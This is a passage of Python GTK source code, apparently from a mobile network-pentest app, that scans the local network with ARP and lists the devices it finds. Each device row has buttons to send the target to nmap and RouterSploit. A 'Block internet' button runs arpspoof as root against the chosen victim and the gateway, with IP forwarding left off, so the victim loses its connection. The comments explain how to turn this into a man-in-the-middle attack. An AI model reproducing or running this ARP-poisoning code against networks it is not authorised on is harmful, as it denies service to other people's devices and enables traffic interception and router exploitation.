        # a tab and the loop reads correctly. Fixing this is one line and
        # avoids having to POSIX-ify the whole scan pipeline.
        self._proc = Process(
            ["bash", "-c", script],
            self._on_line,
            self._on_done,
            root=True,
        )
        self._proc.start()
        self.scan_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)

    def _on_line(self, line: str) -> None:
        # Feed the raw line to the console for the curious, then parse.
        if line.startswith("# "):
            self.output.append(line)
            return
        line = line.rstrip("\n")
        parts = line.split("\t")
        if len(parts) >= 2 and parts[0] == "OK" and len(parts) >= 4:
            ip = parts[1]
            mac = parts[2]
            vendor = parts[3]
            hostname = parts[4] if len(parts) >= 5 else ""
            is_gw = (ip == self._gateway)
            is_self = (ip == self._self_ip)
            dev = Device(ip, mac, vendor, hostname,
                         is_gateway=is_gw, is_self=is_self)
            self._devices[ip] = dev
            self.output.append(
                "[found] %s\t%s\t%s\t%s\n" % (
                    ip, mac, vendor, hostname or "-"))
            self._render_row(dev)
            return
        if line.startswith("DONE\t"):
            self.output.append("# %s\n" % line)
            return
        # Anything else -- errors etc. -- straight to the log.
        self.output.append(line + "\n")

    def _on_done(self, code: int) -> None:
        self._proc = None
        self.scan_btn.set_sensitive(True)
        self.stop_btn.set_sensitive(False)
        n = len(self._devices)
        if code != 0:
            self.output.append("[scan exited with code %d]\n" % code)
        self._empty_row.set_visible(n == 0)
        if n == 0:
            self._empty_row.set_title("Nothing responded to ARP")
            self._empty_row.set_subtitle(
                "The interface might be idle or the AP isolates clients")

    def _stop(self) -> None:
        if self._proc is not None:
            self.output.append("[stopping…]\n")
            self._proc.stop()

    # -------------------------------------------------- device rows
    def _kind_icon(self, kind: str) -> str:
        return {
            "Gateway": "network-wireless-hotspot-symbolic",
            "Router": "network-wired-symbolic",
            "Phone": "phone-symbolic",
            "PC": "computer-symbolic",
            "IoT": "network-workgroup-symbolic",
            "Device": "network-workgroup-symbolic",
        }.get(kind, "network-workgroup-symbolic")

    def _render_row(self, dev: Device) -> None:
        # If a row already exists for this IP we're refreshing; drop the
        # old one first so the ordering re-sort at the end works.
        for r in list(self._device_rows):
            if r.get_name() == dev.ip:
                self.results_group.remove(r)
                self._device_rows.remove(r)
                break

        # Human-first title. Priority order:
        #   1) A real mDNS/NetBIOS hostname (`Philips-FHD-Android`,
        #      `POMELOAR0457`, `printer.local`) -- these are the friendly
        #      names devices publish on purpose.
        #   2) Cleaned-up vendor string (`HUAWEI`, `Apple`, `TP-LINK`) --
        #      much more useful than the placeholder DNS PTR names.
        #   3) Bare "Unknown device" as a last resort.
        # The `_gateway` PTR entry is a special case: getent returns it
        # for whatever IP the DHCP-provided router has, and it says
        # nothing about the actual device brand. On a home LAN "Huawei"
        # or "TP-Link" is what the user wants to see, so we treat that
        # PTR result as "no useful hostname" and let the vendor win.
        # Placeholder hostnames -- values that some resolver returns but
        # that describe the resolver's own role rather than the device.
        # `_gateway` is systemd-resolved's synthetic PTR for the default
        # gateway. `dev.opt` is Huawei's default dnsmasq router hostname.
        # `localhost` is obvious. In every case the vendor line is a
        # better title than the placeholder.
        _PLACEHOLDER_HOSTNAMES = (
            "_gateway", "gateway", "localhost",
            "dev.opt", "openwrt.lan", "lede.lan", "mynetwork.lan",
        )
        vendor_short = _clean_vendor(dev.vendor) if dev.vendor else ""
        useful_host = dev.hostname and dev.hostname.lower() not in _PLACEHOLDER_HOSTNAMES
        if useful_host:
            title = dev.hostname
        elif vendor_short:
            title = vendor_short
        else:
            title = "Unknown device"

        subtitle = dev.kind
        if dev.is_self:
            subtitle += " -- this device"
        if dev.is_gateway:
            subtitle += " -- gateway"

        row = Adw.ExpanderRow(title=title, subtitle=subtitle)
        row.set_name(dev.ip)
        row.add_prefix(Gtk.Image.new_from_icon_name(self._kind_icon(dev.kind)))

        # IP as the primary detail (what the user usually wants to know
        # when they expand): copyable, monospaced-ish.
        ip_row = Adw.ActionRow(title="IP address", subtitle=dev.ip)
        row.add_row(ip_row)

        mac_row = Adw.ActionRow(title="MAC", subtitle=dev.mac.lower())
        row.add_row(mac_row)

        # Vendor detail row (full string, not the shortened form)
        if dev.vendor:
            vrow = Adw.ActionRow(title="Vendor", subtitle=dev.vendor)
            row.add_row(vrow)
        # Hostname source hint (only shown if we actually have one)
        if dev.hostname:
            hrow = Adw.ActionRow(title="Hostname", subtitle=dev.hostname)
            row.add_row(hrow)

        # Actions row. Four buttons is one too many for the ActionRow's
        # single-line suffix area on a phone screen -- they either
        # collide with the row title or overflow off the right edge. We
        # put them in a FlowBox inside a plain ActionRow child so they
        # wrap to a second line when they don't fit, and stay stacked
        # left-aligned on wider screens.
        actions_row = Adw.ActionRow()
        actions_row.set_activatable(False)
        actions_box = Gtk.FlowBox(
            selection_mode=Gtk.SelectionMode.NONE,
            homogeneous=False,
            column_spacing=6,
            row_spacing=6,
            min_children_per_line=1,
            max_children_per_line=4,
        )
        actions_box.set_margin_top(6)
        actions_box.set_margin_bottom(6)
        actions_box.set_margin_start(12)
        actions_box.set_margin_end(12)

        def add_action(label: str, handler, css: str | None = None
                       ) -> Gtk.Button:
            btn = Gtk.Button(label=label, valign=Gtk.Align.CENTER)
            if css:
                btn.add_css_class(css)
            btn.connect("clicked", handler)
            actions_box.append(btn)
            return btn

        add_action("Copy IP",
                   lambda _b, ip=dev.ip: self._copy_ip(ip))
        add_action("Send to nmap",
                   lambda _b, ip=dev.ip: self._send_to_nmap(ip))
        add_action("Send to RouterSploit",
                   lambda _b, ip=dev.ip: self._send_to_routersploit(ip))

        # "Block internet" -- ARP-poison this host and the gateway so
        # its packets get sent to us instead of the router; we don't
        # forward, so its traffic just gets dropped. Same effective
        # outcome as a Wi-Fi deauth (target loses internet), but works
        # from inside the network without monitor mode. Hidden for our
        # own device and the gateway, since neither makes sense as a
        # victim.
        if not dev.is_self and not dev.is_gateway:
            active = dev.ip in self._block_procs
            block_btn = add_action(
                "Stop blocking" if active else "Block internet",
                lambda _b, ip=dev.ip: self._toggle_block(ip),
                css="destructive-action" if active else None,
            )
            self._block_buttons[dev.ip] = block_btn

        actions_row.set_child(actions_box)
        row.add_row(actions_row)

        # Position by sort_key: gateway first, then by IP ascending.
        insert_idx = 0
        my_key = dev.sort_key()
        for existing in self._device_rows:
            existing_dev = self._devices.get(existing.get_name())
            if existing_dev is None:
                insert_idx += 1
                continue
            if existing_dev.sort_key() < my_key:
                insert_idx += 1
            else:
                break
        # Adw.PreferencesGroup does not expose an insert-at-index API, so
        # we always append and then rebuild if the sort is wrong. Cheap at
        # ~10 rows.
        self.results_group.add(row)
        self._device_rows.insert(insert_idx, row)
        self._empty_row.set_visible(False)

    # -------------------------------------------------- row actions
    def _copy_ip(self, ip: str) -> None:
        try:
            clip = self.app_window.get_clipboard()
            clip.set(ip)
            toast(self.app_window, "Copied " + ip)
        except Exception:
            toast(self.app_window, "Copy failed; the IP is " + ip)

    def _send_to_nmap(self, ip: str) -> None:
        self._send_to("nmap", ip)

    def _send_to_routersploit(self, ip: str) -> None:
        self._send_to("routersploit", ip)

    def _send_to(self, module_id: str, value: str) -> None:
        """Switch to the named module and prefill its target via the
        activate_module()/set_target() contract added on the window and
        the destination modules. Falls back to a clipboard copy + toast
        if the destination module does not participate in the contract."""
        activator = getattr(self.app_window, "activate_module", None)
        if callable(activator):
            if activator(module_id, value):
                toast(self.app_window,
                      "Sent %s to %s" % (value, module_id))
                return
        # Fallback path -- older window revisions, or destination module
        # without set_target(). The IP still ends up somewhere useful.
        self._copy_ip(value)
        toast(self.app_window,
              "%s copied. Open %s and paste into target."
              % (value, module_id))

    # ------------------------------------------------- block internet
    def _toggle_block(self, victim_ip: str) -> None:
        """Start or stop an ARP-poison attack against victim_ip.

        Two arpspoof processes are launched, in one wrapper shell so
        that stopping the wrapper kills both:

          * arpspoof -i IF -t VICTIM  GATEWAY  -- tells VICTIM that
            GATEWAY's MAC is ours; VICTIM sends its upstream traffic
            to us.
          * arpspoof -i IF -t GATEWAY VICTIM   -- tells GATEWAY that
            VICTIM's MAC is ours; GATEWAY's replies come to us too.

        We do NOT set net.ipv4.ip_forward, so both directions get
        dropped -- the intended "block internet" behaviour. When the
        wrapper exits, arpspoof itself sends corrective ARPs so the
        LAN settles back within a couple of seconds.
        """
        # If there is already an attack running for this victim, stop.
        if victim_ip in self._block_procs:
            self.output.append("[stopping block on %s]\n" % victim_ip)
            proc = self._block_procs.pop(victim_ip)
            proc.stop()
            btn = self._block_buttons.get(victim_ip)
            if btn is not None:
                btn.set_label("Block internet")
                btn.remove_css_class("destructive-action")
            return

        if not self._gateway:
            toast(self.app_window,
                  "Gateway unknown -- run a scan first")
            return
        if not self._iface:
            toast(self.app_window,
                  "Interface unknown -- run a scan first")
            return

        iface = self._iface
        gw = self._gateway
        self.output.append(
            "# block internet on %s via %s (gw=%s)\n"
            % (victim_ip, iface, gw))
        # `-r` = poison both directions in one process (VICTIM<->GATEWAY).
        # `-c own` = on shutdown, restore both hosts' ARP tables with
        # the real MACs so the LAN heals when the attack stops.
        # `exec 2>&1` merges stderr so arpspoof's progress lines land
        # in the OutputView stream too.
        #
        # We do NOT enable net.ipv4.ip_forward; without it, the packets
        # arrive at the phone's kernel and get dropped as "not for us
        # and no forwarding enabled" -- exactly the "block" behaviour we
        # want. Turning ip_forward on here would make this a MITM
        # instead, which the user did not ask for.
        cmd = (
            "exec 2>&1; "
            "FW=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null); "
            "if [ \"$FW\" = \"1\" ]; then "
            "  echo '[warning] net.ipv4.ip_forward=1 -- packets will be "
            "MITM-forwarded, not blocked. Turn it off to actually cut "
            "the victim off (e.g. stop docker, or "
            "sysctl net.ipv4.ip_forward=0).'; "
            "fi; "
            "arpspoof -i %s -c own -r -t %s %s"
            % (iface, victim_ip, gw)
        )

        proc = Process(
            ["bash", "-c", cmd], self.output.append,
            lambda code, ip=victim_ip: self._on_block_done(ip, code),
            root=True,
        )
        proc.start()
        self._block_procs[victim_ip] = proc

        btn = self._block_buttons.get(victim_ip)
        if btn is not None:
            btn.set_label("Stop blocking")
            btn.add_css_class("destructive-action")
        toast(self.app_window,
              "Blocking %s -- traffic sinks here" % victim_ip)

    def _on_block_done(self, victim_ip: str, code: int) -> None:
        self._block_procs.pop(victim_ip, None)
        btn = self._block_buttons.get(victim_ip)
        if btn is not None:
            btn.set_label("Block internet")
            btn.remove_css_class("destructive-action")
        self.output.append(
            "[block on %s ended: code %d]\n" % (victim_ip, code))
